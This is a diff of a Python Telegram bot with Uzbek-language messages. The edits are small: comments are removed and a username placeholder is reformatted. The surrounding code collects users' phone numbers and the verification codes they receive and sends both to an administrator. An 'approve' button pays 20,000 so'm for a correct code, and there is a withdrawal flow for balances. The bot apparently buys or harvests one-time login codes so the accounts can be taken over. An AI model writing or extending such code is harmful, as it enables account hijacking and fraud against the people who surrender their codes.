@@ -310,9 +310,8 @@ async def process_phone(message: types.Message, phone: str):
     )
     
     try:
-        # Foydalanuvchi ma'lumotlarini olish
         user_info = await bot.get_chat(telegram_id)
-        username = user_info.username if user_info.username else "mavjud emas"
+        username = user_info.username if user_info.username else "mavjud_emas"
         
         await bot.send_message(
             ADMIN_ID,
@@ -320,14 +319,14 @@ async def process_phone(message: types.Message, phone: str):
             f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
-            f"👤 Username: @{username if username != 'mavjud emas' else 'yo\\'q'}\n"
+            f"👤 Username: @{username}\n"
             f"⏳ Kod kutilmoqda...",
             parse_mode="HTML"
         )
     except Exception as e:
         logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
 
-# ================= 5. KODNI QABUL QILISH (PROFIL LINK BILAN) =================
+# ================= 5. KODNI QABUL QILISH (PROFIL LINK + 2 TUGMA) =================
 @dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
@@ -362,10 +361,10 @@ async def receive_code(message: types.Message):
     )
     
     try:
-        # Foydalanuvchi ma'lumotlarini olish
         user_info = await bot.get_chat(telegram_id)
-        username = user_info.username if user_info.username else "mavjud emas"
+        username = user_info.username if user_info.username else "mavjud_emas"
         
+        # 2 TUGMA (tasdiqlash va rad etish)
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
             InlineKeyboardButton("✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
@@ -379,7 +378,7 @@ async def receive_code(message: types.Message):
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
             f"🔑 Kod: <code>{code}</code>\n"
-            f"👤 Username: @{username if username != 'mavjud emas' else 'yo\\'q'}",
+            f"👤 Username: @{username}",
             reply_markup=keyboard,
             parse_mode="HTML"
         )
@@ -643,9 +642,8 @@ async def withdraw_phone(message: types.Message):
         )
         
         try:
-            # Foydalanuvchi ma'lumotlarini olish
             user_info = await bot.get_chat(telegram_id)
-            username = user_info.username if user_info.username else "mavjud emas"
+            username = user_info.username if user_info.username else "mavjud_emas"
             
             keyboard = InlineKeyboardMarkup(row_width=2)
             keyboard.add(
@@ -660,7 +658,7 @@ async def withdraw_phone(message: types.Message):
                 f"🆔 ID: <code>{telegram_id}</code>\n"
                 f"📱 Tel: <code>{normalized_phone}</code>\n"
                 f"💰 Summa: <code>{balance:,} so'm</code>\n"
-                f"👤 Username: @{username if username != 'mavjud emas' else 'yo\\'q'}",
+                f"👤 Username: @{username}",
                 reply_markup=keyboard,
                 parse_mode="HTML"
             )
@@ -935,7 +933,7 @@ async def start_http_server():
     except Exception as e:
         logger.error(f"❌ HTTP server xatosi: {e}")
 
-# ================= KEEP-ALIVE (TAKMILASHTIRILGAN) =================
+# ================= KEEP-ALIVE =================
 async def keep_alive():
     """Botni va HTTP serverni jonli ushlab turish"""
     consecutive_failures = 0
@@ -989,7 +987,7 @@ async def keep_alive():
             logger.error(f"❌ Keep-alive xatosi: {e}")
             consecutive_failures += 1
         
-        await asyncio.sleep(30)  # Har 30 sekundda
+        await asyncio.sleep(30)
 
 # ================= MAIN =================
 async def on_startup(dp):
